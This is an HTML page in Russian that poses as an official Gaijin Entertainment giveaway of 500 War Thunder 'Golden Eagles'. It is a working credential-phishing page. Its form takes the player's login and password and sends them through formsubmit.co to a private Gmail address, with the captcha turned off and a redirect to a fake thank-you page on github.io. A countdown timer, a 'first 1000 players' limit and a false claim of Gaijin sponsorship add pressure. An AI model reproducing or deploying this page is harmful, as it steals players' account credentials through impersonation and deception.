<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>War Thunder — ЗОЛОТЫЕ ОРЛЫ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: url('3840x2160_line_of_contact_logo_ru_dfcacf9311d0af4bf5296e52759249ac.jpg') no-repeat center center/cover; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .card { background: rgba(0, 0, 0, 0.85); padding: 40px; border-radius: 20px; width: 400px; text-align: center; color: white; box-shadow: 0 0 30px rgba(255, 215, 0, 0.3); border: 1px solid gold; }
        h1 { color: gold; margin-bottom: 10px; font-size: 28px; }
        .timer { background: #222; padding: 15px; border-radius: 10px; margin: 20px 0; font-size: 24px; border: 1px solid #444; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 5px; background: #333; color: white; font-size: 16px; }
        button { width: 100%; padding: 14px; background: gold; color: black; font-weight: bold; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 15px; }
        button:hover { background: #ffd700; }
        small { display: block; margin-top: 15px; color: #888; font-size: 12px; }
        .warning-text { color: #ff4444; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://static.wikia.nocookie.net/war-thunder/images/f/f3/WT_logo.png" alt="War Thunder" width="200" style="margin-bottom: 20px;">
        <h1>500 Золотых орлов</h1>
        <p style="margin-bottom: 20px;">в честь ДНЯ ЗАЩИТНИКА ОТЕЧЕСТВА"</p>
        
        <div class="timer" id="timer">Проверяем данные...</div>
        
        <form action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/thanks.html">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            
            <input type="text" name="login" placeholder="Логин или e-mail" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Получить награду</button>
        </form>
        
        <small>Акция ограничена: первые 1000 игроков</small>
        <div class="warning-text">* Cобытие от Gaijin Entertainment</div>
    </div>

    <script>
        var countDownDate = new Date().getTime() + 72000000; // +2 часа
        
        var x = setInterval(function() {
            var now = new Date().getTime();
            var distance = countDownDate - now;
            
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
            
            document.getElementById("timer").innerHTML = hours + "ч " + minutes + "м " + seconds + "с";
            
            if (distance < 0) {
                clearInterval(x);
                document.getElementById("timer").innerHTML = "Акция завершена";
            }
        }, 1000);
    </script>
</body>
</html>
